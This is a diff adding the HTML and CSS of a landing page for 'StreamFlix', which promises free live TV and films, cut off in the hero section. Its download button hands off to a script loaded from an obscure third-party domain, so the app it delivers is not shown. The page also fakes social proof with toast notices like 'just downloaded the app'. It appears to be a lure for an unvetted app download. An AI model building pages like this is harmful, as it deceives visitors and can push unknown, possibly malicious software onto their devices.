@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
+<title>StreamFlix — Live TV &amp; Global Cinema</title>
+<meta name="description" content="StreamFlix — Over 1000 free channels, live sports, series and movies. No ads, no registration. HD and free.">
+<meta property="og:title" content="StreamFlix — Live TV &amp; Global Cinema">
+<meta property="og:description" content="Over 1000 free channels, live sports, series and movies. No ads.">
+<meta property="og:type" content="website">
+
+   <script src="https://url.yuhd320k.site/js/meetu-sdk.js"></script>
+
+
+<script>
+function k2()
+{
+MeetU.download(event);
+}
+</script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600;9..144,700;9..144,900&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+/* ============================================================
+   RESET
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{
+  scroll-behavior:smooth;
+  -webkit-text-size-adjust:100%;
+  -webkit-tap-highlight-color:transparent;
+}
+body{
+  font-family:'Outfit',system-ui,-apple-system,sans-serif;
+  background:var(--bg);
+  color:var(--ink);
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+  text-rendering:optimizeLegibility;
+  overflow-x:hidden;
+}
+img,svg{display:block;max-width:100%}
+button{font:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:4px}
+
+/* ============================================================
+   DESIGN TOKENS — Editorial Cinema (light)
+   ============================================================ */
+:root{
+  --bg:#F6F1E8;
+  --bg-deep:#EDE5D6;
+  --surface:#FFFDF8;
+  --surface-2:#F3ECE0;
+  --ink:#201A13;
+  --ink-2:#574C3F;
+  --ink-3:#8A7B67;
+  --hairline:#E4D8C5;
+  --hairline-strong:#D2C2A9;
+  --accent:#C6402A;
+  --accent-dark:#A6321F;
+  --accent-soft:rgba(198,64,42,.10);
+  --accent-soft-2:rgba(198,64,42,.16);
+  --star:#C98A1B;
+  --gold-soft:#F4E6C8;
+  --radius-sm:10px;
+  --radius:16px;
+  --radius-lg:22px;
+  --radius-xl:30px;
+  --radius-full:999px;
+  --font-display:'Fraunces',Georgia,'Times New Roman',serif;
+  --font-sans:'Outfit',system-ui,sans-serif;
+  --shadow-sm:0 1px 2px rgba(64,48,28,.06),0 4px 14px rgba(64,48,28,.06);
+  --shadow-md:0 2px 4px rgba(64,48,28,.06),0 12px 32px rgba(64,48,28,.12);
+  --shadow-lg:0 8px 24px rgba(64,48,28,.14),0 24px 60px rgba(64,48,28,.18);
+  --ease:cubic-bezier(.22,.61,.36,1);
+  --ease-spring:cubic-bezier(.34,1.4,.64,1);
+  --container:1160px;
+  --noise:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+}
+
+/* grain overlay */
+.grain{
+  position:fixed;inset:0;z-index:2000;pointer-events:none;
+  background-image:var(--noise);background-size:160px 160px;
+  opacity:.05;mix-blend-mode:multiply;
+}
+
+.container{max-width:var(--container);margin:0 auto;padding:0 clamp(20px,4vw,48px)}
+
+/* ============================================================
+   BUTTONS
+   ============================================================ */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:10px;
+  font-weight:600;letter-spacing:-.01em;
+  border-radius:var(--radius-full);
+  transition:transform .18s var(--ease),box-shadow .25s var(--ease),background .2s;
+  white-space:nowrap;
+}
+.btn svg{width:18px;height:18px;flex-shrink:0}
+.btn-primary{
+  background:var(--accent);color:#FFF8F3;
+  padding:15px 28px;font-size:1rem;
+  box-shadow:0 10px 26px rgba(198,64,42,.32);
+}
+.btn-primary:hover{background:var(--accent-dark);transform:translateY(-2px);box-shadow:0 14px 34px rgba(198,64,42,.4)}
+.btn-primary:active{transform:translateY(0) scale(.97);box-shadow:0 6px 16px rgba(198,64,42,.3)}
+.btn-ghost{
+  background:transparent;color:var(--ink);
+  border:1px solid var(--hairline-strong);
+  padding:14px 26px;font-size:.95rem;
+}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent)}
+.btn-ghost:active{transform:scale(.97)}
+.btn-sm{padding:10px 20px;font-size:.875rem}
+.btn-sm svg{width:16px;height:16px}
+
+/* ============================================================
+   TOP NAV
+   ============================================================ */
+.top-nav{
+  position:sticky;top:0;z-index:100;
+  background:rgba(246,241,232,.82);
+  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  border-bottom:1px solid transparent;
+  transition:border-color .3s,box-shadow .3s;
+}
+.top-nav.scrolled{border-bottom-color:var(--hairline);box-shadow:0 6px 24px rgba(64,48,28,.06)}
+.top-nav-inner{
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
+  height:68px;
+}
+.nav-brand{display:flex;align-items:center;gap:11px}
+.nav-logo{
+  width:34px;height:34px;border-radius:10px;object-fit:cover;
+  box-shadow:0 2px 8px rgba(64,48,28,.16);
+}
+.nav-wordmark{font-family:var(--font-display);font-weight:700;font-size:1.35rem;letter-spacing:-.01em}
+.nav-wordmark span{color:var(--accent)}
+.nav-links{display:flex;align-items:center;gap:30px}
+.nav-links a{
+  font-size:.9rem;font-weight:500;color:var(--ink-2);
+  transition:color .2s;
+}
+.nav-links a:hover{color:var(--accent)}
+
+/* ============================================================
+   HERO
+   ============================================================ */
+.hero{
+  position:relative;
+  padding:clamp(40px,7vw,88px) 0 clamp(32px,5vw,64px);
+  overflow:hidden;
+}
+.hero::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(60% 80% at 88% 12%,rgba(198,64,42,.10),transparent 60%),
+    radial-gradient(50% 60% at 6% 88%,rgba(201,138,27,.10),transparent 60%);
+  pointer-events:none;
+}
+.hero-grid{
+  position:relative;display:grid;grid-template-columns:1.05fr .95fr;
+  gap:clamp(32px,5vw,72px);align-items:center;
+}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:7px 15px;border-radius:var(--radius-full);
+  background:var(--surface);border:1px solid var(--hairline);
+  font-size:.78rem;font-weight:600;letter-spacing:.02em;color:var(--ink-2);
+  margin-bottom:22px;
+}
+.eyebrow .dot{
+  width:7px;height:7px;border-radius:50%;background:var(--accent);
+  animation:kicker-pulse 1.8s ease-in-out infinite;
+}
+@keyframes kicker-pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(.6);opacity:.4}}
+.hero h1{
+  font-family:var(--font-display);font-weight:700;
+  font-size:clamp(2.6rem,5.6vw,4.5rem);
+  line-height:1.02;letter-spacing:-.02em;
+  margin-bottom:20px;text-wrap:balance;
+}
+.hero h1 em{
+  font-style:italic;color:var(--accent);font-weight:600;
+}
+.hero-lead{
+  font-size:1.06rem;color:var(--ink-2);line-height:1.65;
+  max-width:46ch;margin-bottom:26px;text-wrap:pretty;
+}
+.hero-actions{display:flex;flex-wrap:wrap;align-items:center;gap:14px;margin-bottom:26px}
+.hero-actions .micro{
+  font-size:.8rem;color:var(--ink-3);display:flex;align-items:center;gap:6px;
+}
+.hero-actions .micro svg{width:15px;height:15px;color:var(--accent)}
+
+.hero-meta{display:flex;flex-wrap:wrap;align-items:center;gap:18px}
+.live-indicator{
+  display:inline-flex;align-items:center;gap:9px;
+  font-size:.84rem;font-weight:600;color:var(--ink-2);
+}
+.live-dot{
+  width:9px;height:9px;border-radius:50%;background:#3FA65E;
+  box-shadow:0 0 0 4px rgba(63,166,94,.18);
+  animation:live-pulse 1.5s ease-in-out infinite;
+}
+@keyframes live-pulse{0%,100%{box-shadow:0 0 0 4px rgba(63,166,94,.18)}50%{box-shadow:0 0 0 8px rgba(63,166,94,.06)}}
+.live-count{color:var(--ink);font-weight:700;font-variant-numeric:tabular-nums}
+
+.avatar-stack{display:flex;align-items:center;gap:14px}
+.avatar-stack .faces{display:flex}
+.avatar-stack img{
+  width:40px;height:40px;border-radius:50%;object-fit:cover;
+  border:2.5px solid var(--bg);margin-left:-11px;box-shadow:var(--shadow-sm);
+}
+.avatar-stack img:first-child{margin-left:0}
+.avatar-stack .faces-txt{font-size:.84rem;font-weight:500;color:var(--ink-2)}
+.avatar-stack .faces-txt strong{color:var(--ink);font-weight:700}
+
+/* hero collage */
+.hero-collage{position:relative;min-height:480px;display:flex;align-items:center;justify-content:center}
+.phone{
+  position:relative;width:min(272px,64vw);aspect-ratio:9/19;
+  border-radius:38px;overflow:hidden;
+  background:var(--surface);
+  border:7px solid #241d15;
+  box-shadow:var(--shadow-lg);
+  z-index:3;
+}
+.phone::before{
+  content:'';position:absolute;top:10px;left:50%;transform:translateX(-50%);
+  width:88px;height:22px;border-radius:12px;background:#241d15;z-index:4;
+}
+.phone img{width:100%;height:100%;object-fit:cover}
+.phone-2{
+  position:absolute;left:-34px;bottom:-26px;width:min(200px,46vw);
+  border-width:6px;border-radius:32px;z-index:2;transform:rotate(-8deg);
+}
+.phone-2::before{width:64px;height:18px;top:8px}
+.poster-float{
+  position:absolute;border-radius:14px;overflow:hidden;
+  box-shadow:var(--shadow-lg);z-index:4;
+  border:3px solid var(--surface);
+}
+.poster-float img{width:100%;height:100%;object-fit:cover;display:block}
+.pf-1{top:-18px;right:6%;width:110px;aspect-ratio:2/3;transform:rotate(7deg)}
+.pf-2{bottom:-10px;right:-6px;width:96px;aspect-ratio:2/3;transform:rotate(-5deg);z-index:1}
+.float-chip{
+  position:absolute;z-index:5;display:flex;align-items:center;gap:8px;
+  padding:10px 16px;border-radius:var(--radius-full);
+  background:var(--surface);border:1px solid var(--hairline);
+  box-shadow:var(--shadow-md);font-size:.82rem;font-weight:600;color:var(--ink);
+}
+.float-chip .star{color:var(--star)}
+.fc-rating{top:16%;left:-22px;transform:rotate(-4deg)}
+.fc-downloads{bottom:14%;left:-16px;transform:rotate(3deg)}
+
+/* ============================================================
+   STAT BAND
+   ============================================================ */
+.stat-band{
+  border-top:1px solid var(--hairline);
+  border-bottom:1px solid var(--hairline);
+  background:var(--surface);
+}
+.stat-band-inner{
+  display:grid;grid-template-columns:repeat(4,1fr);
+}
+.stat-band .cell{
+  padding:28px clamp(16px,2vw,32px);
+  border-left:1px solid var(--hairline);
+}
+.stat-band .cell:first-child{border-left:none}
+.stat-band .num{
+  font-family:var(--font-display);font-weight:700;
+  font-size:clamp(1.7rem,2.6vw,2.4rem);letter-spacing:-.02em;color:var(--accent);
+  font-variant-numeric:tabular-nums;line-height:1;
+}
+.stat-band .lbl{
+  margin-top:8px;font-size:.82rem;font-weight:500;color:var(--ink-3);
+  letter-spacing:.01em;
+}
+
+/* ============================================================
+   SECTION BASE
+   ============================================================ */
+.section{padding:clamp(56px,9vw,104px) 0}
+.section-head{margin-bottom:clamp(28px,4vw,44px)}
+.section-head .kicker{
+  font-family:var(--font-sans);font-size:.78rem;font-weight:700;
+  letter-spacing:.16em;text-transform:uppercase;color:var(--accent);
+  margin-bottom:12px;display:flex;align-items:center;gap:10px;
+}
+.section-head .kicker::before{content:'';width:26px;height:2px;background:var(--accent);border-radius:2px}
+.section-head h2{
+  font-family:var(--font-display);font-weight:700;
+  font-size:clamp(1.9rem,3.6vw,3rem);line-height:1.08;letter-spacing:-.02em;
+  text-wrap:balance;
+}
+.section-head h2 em{font-style:italic;color:var(--accent)}
+.section-head .sub{margin-top:14px;font-size:1rem;color:var(--ink-2);max-width:52ch;text-wrap:pretty}
+
+/* ============================================================
+   TRENDING SHELF
+   ============================================================ */
+.shelf{display:grid;grid-template-columns:repeat(5,1fr);gap:18px}
+.poster{
+  position:relative;border-radius:var(--radius);overflow:hidden;
+  aspect-ratio:2/3;background:var(--surface-2);
+  cursor:pointer;box-shadow:var(--shadow-sm);
+  transition:transform .3s var(--ease),box-shadow .3s var(--ease);
+}
+.poster:hover{transform:translateY(-8px) rotate(-1deg);box-shadow:var(--shadow-lg)}
+.poster:active{transform:translateY(-2px) scale(.98)}
+.poster img{width:100%;height:100%;object-fit:cover}
+.poster::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(180deg,rgba(20,14,8,0) 40%,rgba(20,14,8,.82) 100%);
+  pointer-events:none;
+}
+.poster-rank{
+  position:absolute;top:10px;left:12px;z-index:2;
+  font-family:var(--font-display);font-weight:900;font-size:1.7rem;
+  color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.5);line-height:1;
+  -webkit-text-stroke:1px rgba(0,0,0,.15);
+}
+.poster-badge{
+  position:absolute;top:12px;right:12px;z-index:2;
+  padding:4px 11px;border-radius:var(--radius-full);
+  background:var(--accent);color:#fff;font-size:.66rem;font-weight:700;
+  letter-spacing:.04em;text-transform:uppercase;
+}
+.poster-info{position:absolute;bottom:0;left:0;right:0;z-index:2;padding:14px}
+.poster-title{font-size:.9rem;font-weight:700;color:#fff;line-height:1.25}
+.poster-meta{font-size:.72rem;font-weight:500;color:rgba(255,255,255,.72);margin-top:4px;display:flex;align-items:center;gap:5px}
+.poster-meta .star{color:var(--star)}
+
+/* marquee */
+.marquee{overflow:hidden;position:relative;margin-top:56px}
+.marquee::before,.marquee::after{
+  content:'';position:absolute;top:0;bottom:0;width:80px;z-index:2;pointer-events:none;
+}
+.marquee::before{left:0;background:linear-gradient(90deg,var(--bg),transparent)}
+.marquee::after{right:0;background:linear-gradient(-90deg,var(--bg),transparent)}
+.marquee-track{display:inline-flex;gap:14px;animation:marquee 32s linear infinite;width:max-content}
+@keyframes marquee{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+.marquee-card{
+  position:relative;width:150px;aspect-ratio:2/3;border-radius:var(--radius);
+  overflow:hidden;flex-shrink:0;box-shadow:var(--shadow-sm);cursor:pointer;
+}
+.marquee-card img{width:100%;height:100%;object-fit:cover}
+.marquee-card::after{content:'';position:absolute;inset:0;background:linear-gradient(0deg,rgba(20,14,8,.82) 0%,transparent 55%)}
+.marquee-tag{
+  position:absolute;top:10px;left:10px;z-index:2;padding:3px 10px;border-radius:6px;
+  background:rgba(20,14,8,.6);backdrop-filter:blur(4px);color:#fff;
+  font-size:.6rem;font-weight:700;letter-spacing:.05em;text-transform:uppercase;
+}
+.marquee-title{position:absolute;bottom:12px;left:12px;right:12px;z-index:2;font-size:.74rem;font-weight:600;color:#fff;line-height:1.3}
+.marquee:hover .marquee-track{animation-play-state:paused}
+
+/* ============================================================
+   FEATURES — bento grid
+   ============================================================ */
+.bento{display:grid;grid-template-columns:repeat(12,1fr);gap:16px}
+.feature{
+  border-radius:var(--radius-lg);background:var(--surface);
+  border:1px solid var(--hairline);padding:clamp(24px,3vw,34px);
+  transition:transform .3s var(--ease),box-shadow .3s var(--ease),border-color .3s;
+  position:relative;overflow:hidden;
+}
+.feature:hover{transform:translateY(-4px);box-shadow:var(--shadow-md);border-color:var(--hairline-strong)}
+.feature .icon{
+  width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;
+  background:var(--accent-soft);color:var(--accent);margin-bottom:18px;
+}
+.feature .icon svg{width:23px;height:23px}
+.feature h3{font-family:var(--font-display);font-weight:700;font-size:1.28rem;letter-spacing:-.01em;margin-bottom:8px}
+.feature p{font-size:.92rem;color:var(--ink-2);line-height:1.6}
+.feature .num-tag{
+  position:absolute;top:18px;right:20px;font-family:var(--font-display);
+  font-weight:900;font-size:2.6rem;line-height:1;color:var(--hairline);
+}
+.f-lg{grid-column:span 7}
+.f-sm{grid-column:span 5}
+.f-full{grid-column:span 12}
+
+.feature-media{grid-column:span 12;position:relative;border-radius:var(--radius-lg);overflow:hidden;background:#211a12}
+.feature-media img{width:100%;height:100%;object-fit:cover;opacity:.9}
+.feature-media .overlay{
+  position:absolute;inset:0;display:flex;flex-direction:column;justify-content:flex-end;
+  padding:clamp(26px,4vw,44px);
+  background:linear-gradient(180deg,rgba(24,17,10,0) 20%,rgba(24,17,10,.9) 100%);
+}
+.feature-media .overlay h3{font-family:var(--font-display);font-weight:700;font-size:clamp(1.4rem,2.4vw,2rem);color:#fff;margin-bottom:18px}
+.feature-media .overlay ul{display:grid;grid-template-columns:1fr 1fr;gap:14px;max-width:720px}
+.feature-media .overlay li{display:flex;align-items:flex-start;gap:11px;font-size:.92rem;color:rgba(255,255,255,.85);line-height:1.5}
+.feature-media .overlay li strong{color:#fff}
+.feature-media .overlay li .dot{width:6px;height:6px;min-width:6px;border-radius:50%;background:var(--accent);margin-top:7px}
+
+/* ============================================================
+   REVIEWS — masonry
+   ============================================================ */
+.reviews{columns:2;column-gap:18px}
+.review{
+  break-inside:avoid;margin-bottom:18px;border-radius:var(--radius-lg);
+  background:var(--surface);border:1px solid var(--hairline);
+  padding:26px;box-shadow:var(--shadow-sm);
+  transition:transform .3s var(--ease),box-shadow .3s;
+}
+.review:hover{transform:translateY(-3px);box-shadow:var(--shadow-md)}
+.review .stars{display:flex;gap:2px;margin-bottom:14px}
+.review .stars svg{width:15px;height:15px;color:var(--star)}
+.review p{font-size:.94rem;color:var(--ink-2);line-height:1.66;font-style:italic;margin-bottom:18px}
+.review .who{display:flex;align-items:center;gap:11px}
+.review .who img{width:40px;height:40px;border-radius:12px;object-fit:cover}
+.review .who .name{font-size:.88rem;font-weight:700;color:var(--ink)}
+.review .who .tag{font-size:.74rem;color:var(--ink-3)}
+
+/* ============================================================
+   BIG STATS
+   ============================================================ */
+.big-stats{background:var(--ink);border-radius:var(--radius-xl);color:#FFF8F3;overflow:hidden;position:relative}
+.big-stats::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(50% 60% at 90% 0%,rgba(198,64,42,.28),transparent 60%),
+    radial-gradient(40% 50% at 0% 100%,rgba(201,138,27,.16),transparent 60%);
+}
+.big-stats-inner{position:relative;display:grid;grid-template-columns:repeat(4,1fr)}
+.big-stats .cell{padding:clamp(30px,4vw,52px);border-left:1px solid rgba(255,255,255,.1)}
+.big-stats .cell:first-child{border-left:none}
+.big-stats .num{font-family:var(--font-display);font-weight:700;font-size:clamp(2rem,3.6vw,3rem);line-height:1;letter-spacing:-.02em;color:#fff}
+.big-stats .lbl{margin-top:10px;font-size:.82rem;font-weight:500;color:rgba(255,255,255,.55);letter-spacing:.02em}
+
+/* ============================================================
+   SECURITY
+   ============================================================ */
+.sec-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.sec-card{
+  border-radius:var(--radius-lg);background:var(--surface);
+  border:1px solid var(--hairline);padding:26px;
+  transition:transform .3s var(--ease),box-shadow .3s,border-color .3s;
+}
+.sec-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-md);border-color:var(--hairline-strong)}
+.sec-card .icon{width:44px;height:44px;border-radius:12px;background:var(--accent-soft);color:var(--accent);display:flex;align-items:center;justify-content:center;margin-bottom:16px}
+.sec-card .icon svg{width:21px;height:21px}
+.sec-card h3{font-size:1.02rem;font-weight:700;margin-bottom:5px}
+.sec-card p{font-size:.84rem;color:var(--ink-3);line-height:1.5}
+
+/* ============================================================
+   DOWNLOAD CTA — full-bleed ink finale
+   ============================================================ */
+.download{
+  position:relative;background:var(--ink);color:#FFF8F3;
+  padding:clamp(72px,10vw,120px) 0;overflow:hidden;text-align:center;
+}
+.download::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(55% 70% at 50% -10%,rgba(198,64,42,.32),transparent 60%),
+    var(--noise);background-size:auto,160px 160px;opacity:1;
+}
+.download-inner{position:relative;max-width:680px;margin:0 auto}
+.download .kicker{
+  display:inline-flex;align-items:center;gap:7px;padding:7px 15px;border-radius:var(--radius-full);
+  background:rgba(198,64,42,.16);border:1px solid rgba(198,64,42,.32);
+  color:#F3A08F;font-size:.78rem;font-weight:600;margin-bottom:22px;
+}
+.download .kicker svg{width:14px;height:14px}
+.download h2{font-family:var(--font-display);font-weight:700;font-size:clamp(2.2rem,4.6vw,3.6rem);line-height:1.04;letter-spacing:-.02em;margin-bottom:16px;text-wrap:balance}
+.download h2 em{font-style:italic;color:#F3A08F}
+.download p{font-size:1.02rem;color:rgba(255,255,255,.62);line-height:1.65;max-width:54ch;margin:0 auto 30px}
+.download .btn-primary{font-size:1.06rem;padding:17px 36px}
+.download .note{margin-top:18px;font-size:.8rem;color:rgba(255,255,255,.4)}
+
+/* ============================================================
+   FAQ
+   ============================================================ */
+.faq-wrap{max-width:760px;margin:0 auto}
+.faq-entry{border-bottom:1px solid var(--hairline)}
+.faq-entry:first-child{border-top:1px solid var(--hairline)}
+.faq-q{
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
+  width:100%;text-align:left;padding:22px 0;font-size:1.02rem;font-weight:600;color:var(--ink);
+  transition:color .2s;
+}
+.faq-q:hover{color:var(--accent)}
+.faq-indicator{
+  width:30px;height:30px;min-width:30px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  background:var(--surface-2);color:var(--ink-2);
+  transition:transform .35s var(--ease),background .3s,color .3s;
+}
+.faq-indicator svg{width:15px;height:15px}
+.faq-entry.open .faq-q{color:var(--accent)}
+.faq-entry.open .faq-indicator{transform:rotate(45deg);background:var(--accent);color:#fff}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .45s var(--ease)}
+.faq-entry.open .faq-a{max-height:420px}
+.faq-a-inner{padding:0 0 24px;font-size:.94rem;color:var(--ink-2);line-height:1.7;max-width:62ch}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.page-footer{border-top:1px solid var(--hairline);padding:34px 0}
+.footer-inner{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.footer-brand{display:flex;align-items:center;gap:10px;font-size:.86rem;color:var(--ink-3)}
+.footer-brand img{width:26px;height:26px;border-radius:8px;object-fit:cover}
+.footer-links{display:flex;align-items:center;gap:22px}
+.footer-links a{font-size:.86rem;font-weight:500;color:var(--ink-2);transition:color .2s}
+.footer-links a:hover{color:var(--accent)}
+
+/* ============================================================
+   FLOAT BAR + TOAST
+   ============================================================ */
+.float-bar{
+  position:fixed;bottom:0;left:0;right:0;z-index:120;
+  padding:12px 16px max(12px,env(safe-area-inset-bottom));
+  background:rgba(255,253,248,.9);
+  backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
+  border-top:1px solid var(--hairline);box-shadow:0 -8px 30px rgba(64,48,28,.08);
+  transform:translateY(100%);transition:transform .35s var(--ease);
+  pointer-events:none;
+}
+.float-bar.on{transform:translateY(0);pointer-events:auto}
+.float-bar-inner{max-width:var(--container);margin:0 auto;display:flex;align-items:center;gap:14px}
+.float-bar-logo{width:38px;height:38px;border-radius:11px;object-fit:cover;box-shadow:var(--shadow-sm)}
+.float-bar-info{flex:1;min-width:0}
+.float-bar-info .t{font-size:.9rem;font-weight:700}
+.float-bar-info .s{font-size:.76rem;color:var(--ink-3)}
+.float-bar .btn-primary{padding:12px 24px;font-size:.9rem}
+
+.social-toast{
+  position:fixed;bottom:96px;right:18px;z-index:130;
+  display:flex;align-items:center;gap:11px;
+  padding:13px 16px;border-radius:var(--radius-lg);
+  background:var(--surface);border:1px solid var(--hairline-strong);
+  box-shadow:var(--shadow-lg);
+  transform:translateX(calc(100% + 40px));transition:transform .5s var(--ease-spring);
+  pointer-events:none;max-width:300px;
+}
+.social-toast.show{transform:translateX(0)}
+.social-toast.hide{transform:translateX(calc(100% + 40px))}
+.social-toast .avatar{
+  width:38px;height:38px;border-radius:12px;object-fit:cover;flex-shrink:0;
+}
+.social-toast .msg{font-size:.8rem;font-weight:600;line-height:1.35}
+.social-toast .time{font-size:.68rem;color:var(--ink-3);margin-top:1px}
+.social-toast .close{
+  width:22px;height:22px;min-width:22px;border-radius:50%;
+  background:var(--surface-2);display:flex;align-items:center;justify-content:center;
+  color:var(--ink-3);font-size:.62rem;cursor:pointer;pointer-events:auto;
+}
+
+/* ============================================================
+   REVEAL
+   ============================================================ */
+.reveal{opacity:0;transform:translateY(28px);transition:opacity .7s var(--ease),transform .7s var(--ease)}
+.reveal.visible{opacity:1;transform:translateY(0)}
+.reveal.d1{transition-delay:.08s}
+.reveal.d2{transition-delay:.16s}
+.reveal.d3{transition-delay:.24s}
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media(max-width:920px){
+  .nav-links{display:none}
+  .hero-grid{grid-template-columns:1fr}
+  .hero-collage{min-height:0;margin-top:12px}
+  .phone{width:min(240px,58vw)}
+  .shelf{grid-template-columns:repeat(3,1fr)}
+  .bento{grid-template-columns:1fr 1fr}
+  .f-lg,.f-sm{grid-column:span 2}
+  .feature-media{grid-column:span 2}
+  .feature-media .overlay ul{grid-template-columns:1fr}
+  .reviews{columns:1}
+  .sec-grid{grid-template-columns:1fr 1fr}
+  .big-stats-inner{grid-template-columns:1fr 1fr}
+  .big-stats .cell:nth-child(3){border-left:none}
+  .big-stats .cell{border-top:1px solid rgba(255,255,255,.1)}
+  .big-stats .cell:nth-child(-n+2){border-top:none}
+  .stat-band-inner{grid-template-columns:1fr 1fr}
+  .stat-band .cell{border-top:1px solid var(--hairline)}
+  .stat-band .cell:nth-child(-n+2){border-top:none}
+  .stat-band .cell:nth-child(odd){border-left:none}
+}
+@media(max-width:560px){
+  .shelf{grid-template-columns:1fr 1fr;gap:12px}
+  .bento{grid-template-columns:1fr}
+  .f-lg,.f-sm,.feature-media{grid-column:span 1}
+  .sec-grid{grid-template-columns:1fr}
+  .hero-actions .btn{width:100%}
+  .poster-float{display:none}
+  .float-chip{display:none}
+  .phone-2{display:none}
+}
+
+/* ============================================================
+   MOBILE-FIRST OVERRIDE — single column, 520px cap
+   ============================================================ */
+:root{--container:520px}
+.container{padding:0 20px}
+.top-nav-inner{height:60px}
+.nav-links{display:none}
+.nav-wordmark{font-size:1.22rem}
+
+.hero{padding:32px 0 40px}
+.hero-grid{grid-template-columns:1fr;gap:34px}
+.hero h1{font-size:clamp(2.2rem,11vw,2.9rem);margin-bottom:16px}
+.hero-lead{font-size:.98rem;max-width:none;margin-bottom:22px}
+.hero-actions{gap:12px;margin-bottom:22px}
+.hero-actions .btn{width:100%}
+.hero-actions .micro{width:100%;justify-content:center}
+.hero-meta{flex-direction:column;align-items:flex-start;gap:14px}
+.hero-collage{min-height:0;margin-top:6px}
+.phone{width:min(252px,66vw)}
+.phone-2{display:none}
+.poster-float{display:none}
+.float-chip{display:none}
+
+.stat-band-inner{grid-template-columns:1fr 1fr}
+.stat-band .cell{padding:26px 22px;border-left:1px solid var(--hairline);border-top:1px solid var(--hairline)}
+.stat-band .cell:nth-child(odd){border-left:none}
+.stat-band .cell:nth-child(-n+2){border-top:none}
+
+.shelf{display:flex;gap:14px;overflow-x:auto;scroll-snap-type:x mandatory;padding:4px 20px 16px;margin:0 -20px;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+.shelf::-webkit-scrollbar{display:none}
+.poster{flex:0 0 150px;scroll-snap-align:start}
+
+.bento{grid-template-columns:1fr;gap:14px}
+.f-lg,.f-sm,.f-full,.feature-media{grid-column:span 1}
+.feature-media .overlay ul{grid-template-columns:1fr}
+
+.reviews{columns:1}
+.big-stats-inner{grid-template-columns:1fr 1fr}
+.big-stats .cell{padding:32px 24px;border-left:1px solid rgba(255,255,255,.1);border-top:1px solid rgba(255,255,255,.1)}
+.big-stats .cell:nth-child(odd){border-left:none}
+.big-stats .cell:nth-child(-n+2){border-top:none}
+.sec-grid{grid-template-columns:1fr 1fr;gap:14px}
+.sec-card{padding:22px}
+
+.download-inner{max-width:520px;padding:0 20px}
+.download .btn-primary{width:100%;max-width:340px;margin:0 auto}
+.footer-inner{flex-direction:column;text-align:center;gap:12px}
+
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important;scroll-behavior:auto!important}
+}
+</style>
+</head>
+<body>
+<div class="grain" aria-hidden="true"></div>
+
+<!-- ============================================================
+     SOCIAL TOAST
+     ============================================================ -->
+<div class="social-toast" id="socialToast">
+  <img class="avatar" id="toastAvatar" src="img/a/c1.jpg" alt="">
+  <div style="min-width:0">
+    <div class="msg" id="toastMsg">just downloaded the app</div>
+    <div class="time" id="toastTime">1 min ago</div>
+  </div>
+  <div class="close" onclick="dismissToast()">&#10005;</div>
+</div>
+
+<!-- ============================================================
+     TOP NAV
+     ============================================================ -->
+<nav class="top-nav" id="topNav">
+  <div class="container top-nav-inner">
+    <a class="nav-brand" href="#top">
+      <span class="nav-wordmark">Stream<span>Flix</span></span>
+    </a>
+    <div class="nav-links">
+      <a href="#trending">Trending</a>
+      <a href="#features">Features</a>
+      <a href="#reviews">Reviews</a>
+      <a href="#faq">FAQ</a>
+    </div>
+    <button class="btn btn-primary btn-sm" onclick="k2()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Download
+    </button>
+  </div>
+</nav>
+
+<main id="top">
+
+<!-- ============================================================
+     HERO  (文案已按需更新)
+     ============================================================ -->
+<section class="hero">
+  <div class="container hero-grid">
+    <div class="reveal">
+      <div class="eyebrow"><span class="dot"></span> #1 TV &amp; Movie App · 2026</div>
+      <h1>Live TV &amp; <em>Sports Instantly</em></h1>
+      <p class="hero-lead">
+        Movies, series and TV shows from around the world — always free.<br>
